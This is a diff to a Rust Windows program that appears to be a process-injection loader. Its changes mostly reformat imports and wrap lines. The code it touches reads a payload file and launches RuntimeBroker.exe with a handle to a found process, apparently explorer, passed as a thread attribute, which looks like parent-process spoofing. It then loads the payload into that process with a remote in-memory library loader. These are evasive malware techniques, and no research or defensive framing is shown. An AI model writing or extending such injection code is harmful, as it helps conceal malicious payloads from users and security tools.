@@ -5,46 +5,23 @@ use std::fs::File;
 use std::io::Read;
 use winapi::ctypes::c_void;
 
-use winapi::um::tlhelp32::{
-    CreateToolhelp32Snapshot,
-    TH32CS_SNAPPROCESS,
-    PROCESSENTRY32,
-    Process32First,
-    Process32Next};
-use winapi::um::processthreadsapi::{
-    OpenProcess,
-    CreateRemoteThread,
-    DeleteProcThreadAttributeList};
-use winapi::um::winbase::{
-    lstrlenW, 
-    EXTENDED_STARTUPINFO_PRESENT,
-    INFINITE,
-    STARTUPINFOEXW};
-use winapi::um::processthreadsapi::{
-    CreateProcessW, 
-    PROCESS_INFORMATION, 
-    ResumeThread,
-    LPPROC_THREAD_ATTRIBUTE_LIST,
-    InitializeProcThreadAttributeList,
+use winapi::um::tlhelp32::{ CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,
+    PROCESSENTRY32,Process32First,Process32Next};
+use winapi::um::processthreadsapi::{OpenProcess,DeleteProcThreadAttributeList};
+use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT,STARTUPINFOEXW};
+use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, 
+    ResumeThread,LPPROC_THREAD_ATTRIBUTE_LIST,InitializeProcThreadAttributeList,
     UpdateProcThreadAttribute};
-use winapi::um::synchapi::{
-    Sleep,
-    WaitForSingleObject};
-use winapi::shared::minwindef::TRUE;
-use winapi::um::winnt::PVOID;
-use winapi::um::winnt::HANDLE;
-use std::ffi::OsStr;
+use winapi::um::synchapi::Sleep;
+use winapi::shared::minwindef::{TRUE,FALSE,DWORD};
+use winapi::um::winnt::{PVOID,HANDLE,MAXIMUM_ALLOWED};
+use std::ffi::{OsStr, CStr};
 use std::os::windows::ffi::OsStrExt;
-use winapi::shared::minwindef::FALSE;
-use winapi::um::winnt::MAXIMUM_ALLOWED;
-use std::ffi::CStr;
-use winapi::shared::minwindef::DWORD;
 use std::mem;
-use winapi::shared::ntdef::NULL;
 
 struct ProcessInfo {
     p_handle: HANDLE,
-    base_addr: u64,
+    _base_addr: u64,
 }
 
 fn get_file_as_byte_vec(filename: &String) -> Option<Vec<u8>> {
@@ -118,9 +95,12 @@ unsafe fn find_proc_by_name(_proc_name: &str) -> Option<HANDLE> {
 
 // https://github.com/hniksic/rust-subprocess/blob/master/src/popen.rs
 unsafe fn create_runtime_process()->Option<ProcessInfo> {
-    let _runtime_str_path = OsStr::new("C:\\Windows\\System32\\RuntimeBroker.exe");
-    let runtime_str_arg = OsStr::new("C:\\Windows\\System32\\RuntimeBroker.exe -Embedding");
-    let mut runtime_str_path_w = runtime_str_arg.encode_wide().chain(Some(0)).collect::<Vec<_>>();
+    let _runtime_str_path = OsStr::new(
+        "C:\\Windows\\System32\\RuntimeBroker.exe");
+    let runtime_str_arg = OsStr::new(
+        "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding");
+    let mut runtime_str_path_w = runtime_str_arg.encode_wide()
+        .chain(Some(0)).collect::<Vec<_>>();
     let mut sinfo_ex: STARTUPINFOEXW = mem::zeroed();
     sinfo_ex.StartupInfo.cb = mem::size_of::<STARTUPINFOEXW>() as u32;
 
@@ -143,7 +123,8 @@ unsafe fn create_runtime_process()->Option<ProcessInfo> {
         return None;
     }
     let mut lp_attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
-    sinfo_ex.lpAttributeList = lp_attribute_list.as_mut_ptr().cast::<_>() as LPPROC_THREAD_ATTRIBUTE_LIST;
+    sinfo_ex.lpAttributeList = lp_attribute_list.as_mut_ptr()
+        .cast::<_>() as LPPROC_THREAD_ATTRIBUTE_LIST;
     let mut success = InitializeProcThreadAttributeList(
         sinfo_ex.lpAttributeList, 
         1, 
@@ -156,7 +137,7 @@ unsafe fn create_runtime_process()->Option<ProcessInfo> {
     // UpdateProcThreadAttribute
     let len_pvoid = mem::size_of::<HANDLE>();
     let handle_mem: Box<HANDLE> = Box::new(explorer_handle); // malloc heap
-    let raw_pointer_mut = &*handle_mem as *const HANDLE; // basically &HANDLE bullshit
+    let raw_pointer_mut = &*handle_mem as *const HANDLE;
     success = UpdateProcThreadAttribute(
         sinfo_ex.lpAttributeList,
         0,
@@ -203,7 +184,7 @@ unsafe fn create_runtime_process()->Option<ProcessInfo> {
     Sleep(0x3E8);
     let p_info = ProcessInfo{
         p_handle: pinfo.hProcess,
-        base_addr: 0,
+        _base_addr: 0,
     };
     Some(p_info)
 }
@@ -222,7 +203,9 @@ fn main() {
         None=>return,
     }};
     //let handle = memory_loadlibary_remote(data.as_mut_ptr() as *mut c_void, data.len() as u32, NULL);
-    let handle = memory_loadlibary_remote(data.as_mut_ptr() as *mut c_void, data.len() as u32, process_info.p_handle);
+    let handle = _memory_loadlibary_remote(
+        data.as_mut_ptr() as *mut c_void, 
+        data.len() as u32, process_info.p_handle);
     if handle == 0 {
         println!("loading failed");
     }
